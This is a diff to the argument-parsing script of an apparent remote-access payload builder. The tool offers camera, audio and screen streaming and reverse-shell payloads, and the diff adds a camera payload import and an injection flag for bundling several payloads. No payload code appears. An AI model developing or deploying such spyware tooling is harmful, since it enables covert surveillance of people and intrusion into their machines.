@@ -23,7 +23,7 @@ from payloads.name import PAYLOADS_TYPES
 from errors.WarningHandler import * #error handler you will find the script in warnings\WarningHandler.py directory
 import json
 import socket
-
+from payloads.makers.CameraStreamingPayloadMaker import * #this just the CameraStreaming payload maker and wee are import the class that makes the paylaod
 CR = colors #colors class from assets/colors.py
 
 PARSER = argparse.ArgumentParser()
@@ -38,6 +38,7 @@ PARSER.add_argument("-csp", "--CameraStreamingPort", help="command for chosing a
 PARSER.add_argument("-ssp", "--ScreenStreamingPort", help="command for chosing a costume ScreenStreaming port [automatic chose by default from config.json]")
 PARSER.add_argument("-rsp", "--ReverseShellPort", help="command for chosing a costume ReverseShellPort port [automatic chose by default from config.json]")
 PARSER.add_argument("-asp", "--AudioStreamingPort", help="command for chosing a costume AudioStreamingPort port [automatic chose by default from config.json]")
+PARSER.add_argument("-i", "--injection", help="command to enable the injection that allows you to send multipule payload to one created one [argument => True | False]")
 ARGS = PARSER.parse_args()
 #main args
 __SHOW__ = ARGS.show
@@ -45,8 +46,8 @@ __USE__ = ARGS.use
 __SET__ = ARGS.set
 __TARGET__ = ARGS.target
 __NAME__ = ARGS.name
-#preforming a definition for __SET__
-SET_VALUE = __SET__
+#injection auto
+__injection__ = ARGS.injection
 #settings args for "set" and "use" argument
 __SocketLhost__ = ARGS.SocketLhost
 __SocketLport__ = ARGS.SocketLport
@@ -90,26 +91,10 @@ if __SET__:
         P_LPORT_SOCKET = CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] else __SocketLport__ if __SocketLport__ else NoLportSpec()
         if __SET__ == PAYLOADS_TYPES[0]: #CameraStreaming
             __CameraStreamingPort__ = CONFIG_LOAD["PayloadConfig"]["lport"]["CameraStreamingPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["CameraStreamingPort"] else __CameraStreamingPort__ if __CameraStreamingPort__ else NoCameraStreamingPortSpec()
-            PAYLOADS_TYPES.remove("CameraStreaming")
-            IneededArguments(
-                plus_arg= PAYLOADS_TYPES,
-                main_arg=PAYLOADS_TYPES[0]
-            )
+        
         elif __SET__ == PAYLOADS_TYPES[1]:  #AudioStreaming
             __AudioStreamingPort__ = CONFIG_LOAD["PayloadConfig"]["lport"]["AudioStreamingPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["AudioStreamingPort"] else __AudioStreamingPort__ if __AudioStreamingPort__ else NoAudioStreamingPortSpec()
-            IneededArguments(
-                plus_arg= PAYLOADS_TYPES.remove("AudioStreaming"),
-                main_arg=PAYLOADS_TYPES[1]
-            )
         elif __SET__ == PAYLOADS_TYPES[2]: #ScreenStreaming
             __ScreenStreamingPort__ = CONFIG_LOAD["PayloadCondig"]["lport"]["ScreenStreamingPort"] if CONFIG_LOAD["PayloadCondig"]["lport"]["ScreenStreamingPort"] else __ScreenStreamingPort__ if __ScreenStreamingPort__ else NoScreenStreamingPortSpec()
-            IneededArguments(
-                plus_arg= PAYLOADS_TYPES.remove("ScreenStreaming"),
-                main_arg=PAYLOADS_TYPES[2]
-            )
         elif __SET__ == PAYLOADS_TYPES[3]: #ReverseShell
             __ReverseShellPort__ = CONFIG_LOAD["PayloadConfig"]["lport"]["ReverseShellPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["ReverseShellPort"] else __ReverseShellPort__ if __ReverseShellPort__ else NoReverShellPort()
-            IneededArguments(
-                plus_arg= PAYLOADS_TYPES.remove("ReverseShell"),
-                main_arg=PAYLOADS_TYPES[3]
-            )
